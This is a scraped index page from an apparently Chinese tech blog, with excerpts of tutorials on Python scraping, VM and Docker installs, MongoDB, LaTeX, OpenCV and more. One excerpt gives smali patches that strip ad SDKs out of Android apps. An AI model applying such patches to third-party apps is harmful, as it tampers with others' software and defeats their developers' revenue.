1.使用requests进行请求获取网页内容 import requests from fake_useragent import UserAgent def completionUrl(url): '''对url进行补全''' if "http" in url: return url else: url = f"http://" + url.strip('"') return url def getContent(url): '''获取网页源代码''' # 对url进行补全 url = completionUrl(url) # 发送请求获取网页内容 # 设置随机useragent简单防爬 headers = {"User-Agent": UserAgent().random} try: resp = requests.get(url=url, headers=headers, verify=False) # print(resp.encoding) # 查看返回内容的编码 针对对应的特殊编码进行解码 if resp.encoding == "ISO-8859-1": # 解决ISO-8859-1编码问题 html = resp.text.encode('ISO-8859-1').decode(requests.utils.get_encodings_from_content(resp.text)[0]) # print(html) else: html = resp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72df249955fda515e239936fa98ace75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99bfaedd6b2db658888cf2d88ce6c535/" rel="bookmark">
			H3CASE0306安装包以及在虚拟机上的安装过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先需下载E0306镜像，链接如下
链接：https://pan.baidu.com/s/1xa015_Lp0r8rhgBdY5DmmA?pwd=kb79 提取码：kb79 --来自百度网盘超级会员V5的分享
然后代开VMware Workstation 选择新建虚拟机 然后按下图指示安装
注意：若某步没有流程图，则按默认下一步即可
选择其他64位
这里选择名称和安装路径
这里cpu按实际情况增加，尽量不要超过外机就行
内存也是
网络按情况给，默认给NAT
硬盘可以给大一点
最后一步点击自定义硬件
若是手误点击了完成，则点击编辑虚拟机即可，来到下面这个界面
点击处理器，将虚拟化都勾选上
然后选择CD/DVD ，选择上面下载的ios镜像
显示推荐使用如下配置
完成后点击确定，然后开机，耗时可能有点久，请慢慢等待
这个界面下选择安装组件，至少要选择一个CVM（默认包含CVK）。注意：用空格键选择，选择好后，选项前面的中括号内有*才表示被选择，然后按下tab键，套转到continue，回车。
选择中文
IP地址设置为和nat同网段的ip，我的是100，
nat网络的网管默认都为 .2
这个是DNS配置，也可以用nat网关
设置主机名
下面是域名，默认为无，直接回车
然后是设置root密码和确认root密码，就不放图了
然后就是启动HBA
后面两步默认回车就行
然后后面注意选择yes回车安装即可
安装完成后选择continue重新启动即可，出现下面这个界面就代表安装完成
在浏览器输入界面的 ip+8080 端口就可以进入CAS可视化管理界面
默认账户密码都是admin
进来之后按如下增加一个主机池
然后按如下增加主机（也可以先增加一个集群，再在集群中增加主机）
ip选择CVM的ip，也就是浏览器输入的ip，账户的密码是刚才建立CVM时设置的，账户名为root
点击确定，云主机则建立完成
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23607405fe35f29d842fa005809ff509/" rel="bookmark">
			耗时2.5h含泪打造windows10家庭版docker安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、事出有因二、安装流程Problem1Problem2Problem3 三、胜利的曙光 一、事出有因 由于最近需要跑通github上的一个代码，那个github上的代码需要通过docker部署到本地，但是我的电脑上并没有docker,真的是含泪历时2.5h才把docker在我的windows电脑上装好。
二、安装流程 最开始我在win10家庭版上安装docker参考的是文章 Windows系统下安装Docker并实现项目的部署发布_docker windows resources_爱吃鱼的IT工作者的博客-CSDN博客这篇文章是2020年的，现在已经2023年了，但是帮助还是很大，按照上述博客将流程走完之后。你会碰到第一个问题：
Problem1 问题描述：
windows 正在查找bash.exe。如果想亲自查找文件，请点击“浏览”的问题
这个问题是在点击
出现的。
参考博客：
解决点击Docker出现windows 正在查找bash.exe。如果想亲自查找文件，请点击“浏览”的问题_T_白日梦想家的博客-CSDN博客解决
Problem2 问题描述：Downloading C:\Users\admin\.docker\machine\cache\boot2docker.iso from https://github.com/boot2docker/boot2docker/releases/download/v17.05.0-ce/boot2do cker.iso..."
解决思路：
这个问题是在点击
出现的。大概意思就是我需要到这个地址https://github.com/boot2docker/boot2docker/releases/download/v19.03.12/boot2docker.iso下载镜像文件，放置到C:\Users\admin\.docker\machine\cache这个目录下，但是我发现根本下载不了，原github库作者已将闭库了，无法下载，需要手动到Boot2Docker - Browse /v19.03.12 at SourceForge.net下载，然后放到指定目录下。
详情还可参见博客：【故障】旧版本的Docker Toolbox 无法正常运行的解决办法 - 爱码网 (likecs.com)
Problem3 问题描述：Error creating machine:Error in driver during machine creation: Unable to start the VM: C:\Program Files\Oracle\VirtualBox\BoxManage.exe startvm default --type headless failed:……
这个问题也是在点击
出现的。
解决思路：
这个问题我是参照博客：win10安装docker踩坑_error creating machine: error in driver during mac_da_xiangxiang的博客-CSDN博客解决的，但是这个博主讲了有没完全讲，他没有提到更新oracle virtual box的方法。后面我是到Download_Old_Builds_6_1 – Oracle VM VirtualBox,下载的6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23607405fe35f29d842fa005809ff509/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/386f85349edef41ecffb53538d3b165c/" rel="bookmark">
			面向对象和面向过程的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
1. 面向过程
2. 面向对象
3. 优缺点比较 面向过程
面向对象
前言 学习编程， 基本功是掌握编程语言，但编程的本质是逻辑，所以编程思维的培养也很重要。面向过程和面向对象是两种重要的编程思想，下面讲述一下这两者的区别和优缺点比较。
1. 面向过程 面向过程是一种以事件为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。
举个例子，下五子棋，面向过程的设计思路是首先分析解决这个问题的步骤：
（1）开始游戏（2）黑子先走（3）绘制画面（4）判断输赢（5）轮到白子（6）绘制画面（7）判断输赢（8）返回步骤（2） （9）输出最后结果。
用函数实现上面一个一个的步骤，然后在下五子棋的主函数里依次调用上面的函数（不同的编程语言有不同的调用方法，我这里写的是直接调用）：
下五子棋{ 开始游戏（）； 黑子先走（）； 绘制画面（）； 判断输赢（）； 轮到白子（）； 绘制画面（）； 判断输赢（）； 返回到 黑子先走（）； 输出最后结果； } 可见，面向过程始终关注的是怎么一步一步地判断棋局输赢的，通过控制代码，从而实现函数的顺序执行。
2. 面向对象 在日常生活或编程中，简单的问题可以用面向过程的思路来解决，直接有效，但是当问题的规模变得更大时，用面向过程的思想是远远不够的。所以慢慢就出现了面向对象的编程思想。世界上有很多人和事物，每一个都可以看做一个对象，而每个对象都有自己的属性和行为，对象与对象之间通过方法来交互。面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个对象在整个解决问题的步骤中的属性和行为。
在下五子棋的例子中，用面向对象的方法来解决的话，首先将整个五子棋游戏分为三个对象:
（1）黑白双方，这两方的行为是一样的。 （2）棋盘系统，负责绘制画面 （3）规则系统，负责判定犯规、输赢等 然后赋予每个对象一些属性和行为： （4）第一类对象（黑白双方）负责接受用户输入，并告知第二类对象（棋盘系统）棋子布局的变化，棋盘系统接收到了棋子的变化，并负责在屏幕上面显示出这种变化，同时利用第三类对象（规则系统）来对棋局进行判定。 可以看出，面向对象是以功能来划分问题，而不是以步骤解决。比如绘制画面这个行为，在面向过程中是分散在了多个步骤中的，可能会出现不同的绘制版本，所以要考虑到实际情况进行各种各样的简化。而面向对象的设计中，绘图只可能在棋盘系统这个对象中出现，从而保证了绘图的统一。
3. 优缺点比较 面向过程 优点：
流程化使得编程任务明确，在开发之前基本考虑了实现方式和最终结果，具体步骤清楚，便于节点分析。
效率高，面向过程强调代码的短小精悍，善于结合数据结构来开发高效率的程序。
缺点：
需要深入的思考，耗费精力，代码重用性低，扩展能力差，后期维护难度比较大。
面向对象 优点:
结构清晰，程序是模块化和结构化，更加符合人类的思维方式；
易扩展，代码重用率高，可继承，可覆盖，可以设计出低耦合的系统；
易维护，系统低耦合的特点有利于减少程序的后期维护工作量。
缺点：
开销大，当要修改对象内部时，对象的属性不允许外部直接存取，所以要增加许多没有其他意义、只负责读或写的行为。这会为编程工作增加负担，增加运行开销，并且使程序显得臃肿。
性能低，由于面向更高的逻辑抽象层，使得面向对象在实现的时候，不得不做出性能上面的牺牲，计算时间和空间存储大小都开销很大。
以上就是面向对象和面向过程的区别 希望对大家有所帮助！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d375eb3144c41a1c3cdfd6e037c3ab32/" rel="bookmark">
			Android Studio Unsupported Java
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题：升级 Android Studio Flamingo 出现如下报错信息
Unsupported Java. Your build is currently configured to use Java 17.0.2 and Gradle 7.0.2. Possible solution: - Open Gradle wrapper settings, change `distributionUrl` property to use compatible Gradle version and reload the project 解决方法：File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Build Tools -&gt; Gradle
将 Gradle JDK 修改为本机安装的 JDK 版本即可，如: JDK-11.0.15 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d675e1c4488d4e3e49f40a2d24437c0/" rel="bookmark">
			Ubuntu 18.04配置ORB-SLAM2和ORB-SLAM3运行环境&#43;ROS实时运行ORB-SLAM2&#43;SLAM相关库的安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、换源二、安装三方库2.1 安装必要的依赖项2.2 安装Pangolin2.3 安装OpenCV32.4 安装Eigen3 三、安装ORB-SLAM2四、安装ORB-SLAM34.1 安装OpenCV44.2 安装ORB-SLAM3 五、安装ROS Melodic六、ROS安装摄像头驱动七、ROS实时运行ORB-SLAM27.1 相机标定7.2 编译ORB_SLAM2 ROS例子7.3 实时运行ORB-SLAM2 八、安装SLAM测评工具evo8.1 安装evo8.2 测试evo 九、安装PCL和Octomap十、安装优化库：G2O、GTSAM和Ceres十一、安装Sophus 在新安装的Ubuntu 18.04系统中配置ORB-SLAM2和ORB-SLAM3的运行环境，大部分内容与我的另一篇文章Ubuntu 20.04配置ORB-SLAM2和ORB-SLAM3运行环境+ROS实时运行ORB-SLAM2+Gazebo仿真运行ORB-SLAM2+各种相关库的安装一样，本文为其拓展
一、换源 Ubuntu系统自带的源都是国外的网址，国内用户在使用的时候下载比较慢甚至无法获取，在安装各种库或软件时会深受其折磨！解决方案是直接替换成国内的镜像源
（1）备份源文件：
sudo cp /etc/apt/sources.list /etc/apt/sources.list.old
（2）打开文件：
sudo gedit /etc/apt/sources.list
（3）换源：推荐清华的源（根据自己的网去尝试，选择最快的一个，查看ubuntu版本命令：cat /etc/issue）：清华源地址，选择Ubuntu版本并复制源，覆盖sources.list文件原来的内容。
（4）换过源之后要更新：
sudo apt-get update
二、安装三方库 2.1 安装必要的依赖项 sudo apt-get update sudo apt-get install git gcc g++ vim make cmake 2.2 安装Pangolin 安装Pangolin 0.6(稳定版)（官网下载地址，不要下载最新master版，编译的时候可能有错误）
（1）安装依赖项
sudo apt-get install libglew-dev libboost-dev libboost-thread-dev libboost-filesystem-dev sudo apt-get install ffmpeg libavcodec-dev libavutil-dev libavformat-dev libswscale-dev libpng-dev （2）配置并编译
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d675e1c4488d4e3e49f40a2d24437c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/723802be469dff513136e5e6b803d3b6/" rel="bookmark">
			iis站点预加载-发布站点后，自动预热
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IIS 热启动设置的方法 场景
IIS回收程序池后，第一个访问网站的人总是需要“享受”卡顿，因为所有对象都被回收了，需要重新初始化。如果IIS挂载了后台服务，应用程序池回收并重启后，后台服务在没有人访问的时候是不会启动的。 解决方案
IIS安装“应用程序初始化”
网站启用预加载
打开配置编辑器
选择配置节
设置true 。点击集合
设置打开的初始页
应用程序池设置为一直开启模式
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1568e819e32d75a7b4fce332eecb0b45/" rel="bookmark">
			IIS防止应用程序池回收
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/259a8c3aaedd1095307c46e17578f1f6/" rel="bookmark">
			【java】几种跳出 for循环的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Java中，有多种方法可以跳出for循环，从而停止循环的执行。以下是其中的三种常见的方法：
1. break语句：使用break语句可以结束整个for循环的执行： for (int i = 0; i &lt; 10; i++){ if(i == 5){ break; } System.out.println(i); } 当i等于5时，break语句会将控制流程跳出for循环从而停止后续代码的执行。
2. return语句：如果你想要跳出当前方法并且停止for循环的执行，可以使用return语句： for (int i = 0; i &lt; 10; i++){ if(i == 5){ return; } System.out.println(i); } 当i等于5时，return语句会立即退出整个方法从而停止对for循环的执行。
3. continue语句：如果你想要跳过当前迭代，直接开始下一个迭代， 可以使用continue语句： for (int i = 0; i &lt; 10; i++){ if(i == 5){ continue; } System.out.println(i); } 当i等于5时，continue语句会跳过当前迭代，直接开始下一个迭代。
总结： 以上是在Java中跳出for循环的三种常见方法：使用break语句可以结束整个for循环的执行；使用return语句可以立即退出整个方法从而停止对for循环的执行；使用continue语句可以跳过当前迭代并开始下一个迭代。根据不同的应用场景选择合适的方式。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7f28ed146903141466ee5735cf861a4/" rel="bookmark">
			第23章 MongoDB 复制（副本集）教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第23章 MongoDB 复制（副本集）教程 MongoDB复制是将数据同步在多个server 的过程。
复制提供了数据的冗余备份，并在多个server 上存储数据副本，提高了数据的可用性， 并可以保证数据的安全性。
复制还允许尊敬的读者从硬件故障和服务中断中恢复数据。
什么是复制? 保障数据的安全性数据高可用性 (24*7)灾难恢复无需停机维护（如备份，重建索引，压缩）分布式读取数据 MongoDB复制原理 mongodb的复制至少需要两个节点。其中一个是主节点，负责处理客户端请求，其余的都是从节点，负责复制主节点上的数据。
mongodb各个节点常见的搭配方式为：一主一从、一主多从。
主节点记录在其上的所有操作oplog，从节点定期轮询主节点获取这些操作，然后对自己的数据副本执行这些操作，从而保证从节点的数据与主节点一致。
MongoDB复制结构图请在输出结果查看
以上结构图中，客户端从主节点读取数据，在客户端写入数据到主节点时， 主节点与从节点进行数据交互保障数据的一致性。
副本集特征： N 个节点的集群任何节点可作为主节点所有写入操作都在主节点上自动故障转移自动恢复 MongoDB副本集设置 在本教程中咱们使用同一个MongoDB来做MongoDB主从的实验， 操作步骤如下：
1、关闭正在运行的MongoDBserver 。
现在咱们通过指定 --replSet 选项来启动mongoDB。–replSet 基本语法格式如下：
mongod --port "PORT" --dbpath "YOUR_DB_DATA_PATH" --replSet "REPLICA_SET_INSTANCE_NAME" 实例 mongod --port 27017 --dbpath "D:\set up\mongodb\data" --replSet rs0 以上实例会启动一个名为rs0的MongoDB实例，其端口号为27017。
启动后打开命令提示框并连接上mongoDB服务。
在Mongo客户端使用命令rs.initiate()来启动一个新的副本集。
咱们可以使用rs.conf()来查看副本集的配置
查看副本集状态使用 rs.status() 命令
副本集添加成员 添加副本集的成员，咱们需要使用多台server 来启动mongo服务。进入Mongo客户端，并使用rs.add()方法来添加副本集的成员。
语法 rs.add() 命令基本语法格式如下：
&gt;rs.add(HOST_NAME:PORT) 实例 假设陛下已经启动了一个名为mongod1.net，端口号为27017的Mongo服务。 在客户端命令窗口使用rs.add() 命令将其添加到副本集中，命令请在输出结果查看
&gt;rs.add("mongod1.net:27017") &gt; MongoDB中陛下只能通过主节点将Mongo服务添加到副本集中， 判断当前运行的Mongo服务是否为主节点可以使用命令db.isMaster() 。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7f28ed146903141466ee5735cf861a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc6c94a6330daa18c8849c27647e8ebb/" rel="bookmark">
			【自用】【持续更新】LaTeX常用基础语法大全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 LaTeX常用基础语法大全段落居中排序列表 文本、变量加粗斜体向量（顶有向量箭头→）估计（顶有尖头hat）平均（顶有横线）顶有波浪号~分式24个希腊字母花体、集合手写体 大型运算求和 数组矩阵符号属于集合之间的各种关系（包含于、包含、真包含于……）任意存在因为、所以无穷大尖括号（也就是常见的向量夹角 c o s ⟨ a , b ⟩ cos\langle a,b\rangle cos⟨a,b⟩）小于等于、大于等于、不等于、恒等于、恒不等于远小于、远大于约等于向上取整、向下取整绝对值双竖线花括号乘号开n次方导数 LaTeX常用基础语法大全 段落 居中 \begin{center} 要居中的内容 \end{center} 排序列表 % 原始模板 \begin{enumerate} \item 第一小题 \item 第二小题 \end{enumerate} % 自定义排序列表的编号形式 \begin{enumerate}[(1)] \item 第一小题 \item 第二小题 \end{enumerate} \begin{enumerate}[a.] \item 第一小题 \item 第二小题 \end{enumerate} \begin{enumerate}[a)] \item 第一小题 \item 第二小题 \end{enumerate} % 实心圆点列表 \begin{itemize} \item 第一小题 \item 第二小题 \end{itemize} % 短横杠列表 \begin{itemize} \item[-] 第一小题 \item[-] 第二小题 \end{itemize} 文本、变量 加粗 \textbf{A}、\boldsymbol{A}、\boldsymbol{我们}、\textbf{我们}、我们 A 、 A 、 我们 、 我们 、我们 \textbf{A}、\boldsymbol{A}、\boldsymbol{我们}、\textbf{我们}、我们 A、A、我们、我们、我们
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc6c94a6330daa18c8849c27647e8ebb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88a9e8b505ee32cb05153020a93f8938/" rel="bookmark">
			如何将一副彩色图像分别转化HSV、YCrCb、HLS、XYZ、LAB、YUV色彩模型的图像，并显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import cv2 from matplotlib import pyplot as plt # 读取图片 img = cv2.imread('C:/Users/asus/Desktop/fj1.jpg') # 修改图片格式 img1 = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) img1 = cv2.cvtColor(img, cv2.COLOR_BGR2HSV) img2 = cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb) img3 = cv2.cvtColor(img, cv2.COLOR_BGR2HLS) img4 = cv2.cvtColor(img, cv2.COLOR_BGR2XYZ) img5 = cv2.cvtColor(img, cv2.COLOR_BGR2LAB) img6 = cv2.cvtColor(img, cv2.COLOR_BGR2YUV) # 将图片以matplot的形式打印出来 plt.subplot(231), plt.imshow(img1), plt.axis('off'), plt.title('HSV') plt.subplot(232), plt.imshow(img2), plt.axis('off'), plt.title('YCrCb') plt.subplot(233), plt.imshow(img3), plt.axis('off'), plt.title('HLS') plt.subplot(234), plt.imshow(img4), plt.axis('off'), plt.title('XYZ') plt.subplot(235), plt.imshow(img5), plt.axis('off'), plt.title('LAB') plt.subplot(236), plt.imshow(img6), plt.axis('off'), plt.title('YUV') plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88a9e8b505ee32cb05153020a93f8938/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08edb42e34cb0a792e8badb0479b497c/" rel="bookmark">
			统信(uos)arm系统安装银河麒麟v10arm版虚拟机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 注：转载请注明出处！ 注：转载请注明出处！ 注：转载请注明出处！ 一、准备工作
1、安装虚拟机管理软件qemu
2、官网下载银河麒麟v10镜像，需要填写信息申请一下，本文使用镜像：
Kylin-Desktop-V10-SP1-General_release-2303-ARM64.ios
申请地址：
产品试用申请·国产操作系统、银河麒麟、中标麒麟、开放麒麟、星光麒麟——麒麟软件官方网站 (kylinos.cn)
二、安装步骤
1、打开qemu新建虚拟机
2、选择 本地安装介质---&gt;前进
架构选项使用的是默认架构选项
3、选择下载好的镜像，选择系统，本文选择的系统是：Debian 10，然后点击前进
4、分配内存和CPU，然后点击前进
5、分配空间，点击前进
6、填写虚拟机名称，选择在安装前自定义配置，点击完成
7、点击添加硬件 --&gt; 输入 --&gt; 类型选择“通用USB Keyboard” --&gt;点击完成
8、点击添加硬件 --&gt; 输入 --&gt; 类型选择“通用EvTouch USB 图形数位板” --&gt;点击完成
9、点击添加硬件 --&gt; 图形--&gt; 类型选择“VNC服务器” --&gt;点击完成
10、点击开始安装
11、依次出现如下安装画面：
选择：Install Kylin-Desktop V10-SP1
等待安装：
12、安装成功继续选择后面选项
注：转载请注明出处！ 注：转载请注明出处！ 注：转载请注明出处！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9756e0ea439aecd48fc09ef046a2765/" rel="bookmark">
			Unity中实现2D遮罩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：前言 可以使用SpriteMask用作控制图形显示区域，SpriteRenderer用作显示图形，在SpriteRenderer中选择MaskInteraction遮罩类型
二：基础使用 创建一个空物体，添加SpriteMask组件，设置遮罩图片。创建一个空物体，添加SpriteRenderer组件用作显示图，设置SpriteRenderer的MaskInteraction遮罩类型
需要遮罩的Sprite不需要作为挂载了SpriteMask的子物体
——None：不遮罩
——Visible Inside Mask：遮罩区域内的图形显示，遮罩以外的图形隐藏
——Visible Outside Mask：遮罩区域内的图形隐藏，遮罩以外的图形显示
三：配合Sorting Order组件 添加Sorting Order组件控制一个组的层级
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c32a78c6e03c4568ee23fb1d63006a28/" rel="bookmark">
			Python中如何编写接口，以及如何请求外部接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python中如何编写接口，以及如何请求外部接口 Python是一种既简单又强大的编程语言，也是现代软件开发的重要工具之一。在开发过程中，我们通常需要编写接口，并且从外部接口获取数据。本文将介绍如何在Python中编写接口，以及如何请求外部接口。
编写接口 在Python中，可以使用Flask和Django等框架来编写接口。本文以Flask为例，介绍如何编写一个简单的接口。
首先，我们需要安装Flask。可以使用以下命令来安装Flask：
pip install flask 接下来，我们可以创建一个简单的Flask应用程序，并定义一个接口。以下代码演示了如何创建一个返回“Hello, World!”字符串的接口：
from flask import Flask app = Flask(__name__) @app.route('/') def hello_world(): return 'Hello, World!' 在上面的代码中，我们首先导入了Flask模块，然后创建了一个Flask应用程序。接着，我们使用@app.route装饰器来定义一个接口，该接口的URL为根目录/。最后，我们定义了一个函数hello_world，该函数返回一个字符串“Hello, World!”。
我们可以使用以下命令来启动该应用程序：
if __name__ == '__main__': app.run() 在运行应用程序后，可以在Web浏览器中访问http://127.0.0.1:5000/，即可看到“Hello, World!”字符串。
请求外部接口 除了编写自己的接口，我们还可能需要从外部接口获取数据。Python中有很多库可以用来请求外部接口，如requests、urllib等。以下代码演示了如何使用requests库来请求一个简单的接口，并获取响应的数据：
import requests response = requests.get('&lt;https://jsonplaceholder.typicode.com/posts/1&gt;') if response.status_code == 200: print(response.json()) else: print("Error: " + response.text) 在上面的代码中，我们首先导入了requests库。然后，我们使用requests.get函数来请求一个URL为https://jsonplaceholder.typicode.com/posts/1的接口，并将响应保存在response变量中。如果响应的状态码为200，即请求成功，我们可以使用response.json()函数来获取响应的JSON数据。否则，我们打印错误信息。
总结一下，本文介绍了如何在Python中编写接口，并且从外部接口获取数据。Flask是一个简单易用的框架，可以用来快速编写接口。requests库是一个常用的HTTP库，可以用来请求外部接口。希望本文能够对你有所帮助！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd7a2d1612d20f9bc01e776fc2d30ae2/" rel="bookmark">
			RabbitMQ如何保证消息的发送和接收
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、RabbitMQ如何保证消息的发送和接收
1.ConfirmCallback方法
ConfirmCallback是一个回调接口，消息发送到broker后触发回调，确认消息是否到达broker服务器，也就是只确认消息是否正确到达Exchange交换机中。
2.ReturnCallback方法
通过实现ReturnCallback接口，启动消息失败返回，此接口是在交换机路由不到队列时触发回调，该方法可以不使用，因为交换机和队列是在代码里绑定的，如果消息投递到broker后几乎几乎不存在绑定队列失败，除非你代码写错了。
3.消息确认接收
RabbitMQ消息确认机制ack是默认自动确认的，自动确认会在消息发送给消费者后立即确认，但存在消息丢失的可能，如果消费逻辑出现异常，假如回滚了，也只是保证了数据一致性，但是消息还是丢了，也就是消费端没有成功处理这个消息，相当于消息丢失。
消费者收到消息后，手动调用Basic.ack或Basic.Nack或Basic.Reject后，RabbitMQ收到这些消息后，才认为本次投递完成。
Basic.ack 用于确认当前消息，Basic.Nack 用于否定当前消息 ，Basic.Reject 用于拒绝当前消息
Nack ，Reject 后有能力要求是否requeue消息或进入死信队列。
1.1 生产时消息重复
由于生产者发送消息给MQ，在MQ确认的时候出现了网络波动，生产者没有收到确认，实际上MQ已经接收到了消息。这时候生产者就会重新发送一遍这条消息。
生产者中如果消息未被确认，或确认失败，我们可以使用定时任务+（redis/db）来进行消息重试。
1.2消费时消息重复
消费者消费成功后，再给MQ确认的时候出现了网络波动，MQ没有接收到确认，为了保证消息被消费，MQ就会继续给消费者投递之前的消息。这时候消费者就接收到了两条一样的消息。
让每个消息携带一个全局的唯一ID，即可保证消息的幂等性，具体消费过程为：
消费者获取到消息后先根据id去查询redis/db是否存在该消息
如果不存在，则正常消费，消费完毕后写入redis/db
如果存在，则证明消息被消费过，直接丢弃。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc7737023fbecc89f708fce1bfe3ff33/" rel="bookmark">
			HTML5夜晚海上轮船动画js特效代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载地址
HTML5夜晚海上轮船动画特效代码，pixi.js制作夜空下海面上迷失的轮船航行动画场景特效
dd:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58a2855eb78bd4ec04828b7b9e17141e/" rel="bookmark">
			Android 去除广告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
关闭Google全屏广告
隐藏Google横幅广告
去除Google广告
去除Facebook广告
去除UnityAds广告
去除MoPub广告
去除穿山甲平台广告
去除Start.io广告
去除Stack Appodeal广告
去除Chartboost广告
去除Applovin广告
去除Ogury广告
去除iron广告
去除Amazon广告
去除inmobi广告
去除Smaato广告
去除Tapjoy广告
去除AdColony广告
去除HyprMX广告
去除OneSignal广告
去除appnext广告 去除TradPlus广告
去除yandex广告 去除Vungle广告
去除Yodo1Mas广告
去除solodroid广告
关闭Google全屏广告 com.google.android.gms.ads.AdActivity
.method protected onCreate(Landroid/os/Bundle;)V .locals 1 invoke-super {p0, p1}, Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle;)V invoke-virtual {p0}, Landroid/app/Activity;-&gt;finish()V return-void .end method 隐藏Google横幅广告 com.google.android.gms.ads.BaseAdView
The ad size can only be set once on AdView
The ad unit ID can only be set once on AdView.
.method public onLayout(ZIIII)V .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58a2855eb78bd4ec04828b7b9e17141e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2e3a6d48bfd6d4716af91f5c9260369/" rel="bookmark">
			JavaWeb（Maven、Tomcat、Servlet、Jsp）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网站是如何进行访问的： 输入一个域名/地址，回车；检查本机的：C:\Windows\System32\drivers\etc\hosts配置文件下有没有这个域名映射； 有：直接返回对应的ip地址，这个地址中，有我们需要访问的web程序，可以直接访问。没有：去DNS服务器找，找到的话就返回，找不到就返回找不到。 发布一个web网站 将自己写的网站，放到服务器（Tomcat）中指定的web应用的文件夹（webapps）下，就可以访问了。 网站应该有的结构 （webapps中一个文件夹代表一个web应用，可以进行访问）
--webapps : Tomcat服务器的web目录 -ROOT ：Tomcat发布的网站 -项目名 ： 网站的目录名 WEB-INF -class : java程序	-lib : web应用所依赖的jar包 -web.xml : 网站配置文件 -index.html 默认的首页 Http Http（超文本传输协议）是一个简单的请求-响应协议，它通常运行在TCP之上。
文本：html，字符串，…超文本：图片，音乐，视频，定位，地图…默认端口：80 https：安全
默认端口：443 http的两个时代：
http1.0 HTTP/1.0：客户端可以与web服务器连接后，只能获得一个web资源，断开连接。 http2.0 HTTP/1.1：客户端可以与web服务器连接后，可以获得多个web资源。 Http请求
客户端——发请求（Request）——服务器 百度举例：
Request URL: https://www.baidu.com/	请求地址 Request Method: GET	get方法/post方法 Status Code: 200 OK	状态码 200 Remote Address: 14.215.177.38:443	远程地址 Referrer Policy: strict-origin-when-cross-origin	协议 Accept: text/html	类型 Accept-Encoding: gzip, deflate, br	类型编码 Accept-Language: zh-CN,zh;q=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2e3a6d48bfd6d4716af91f5c9260369/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
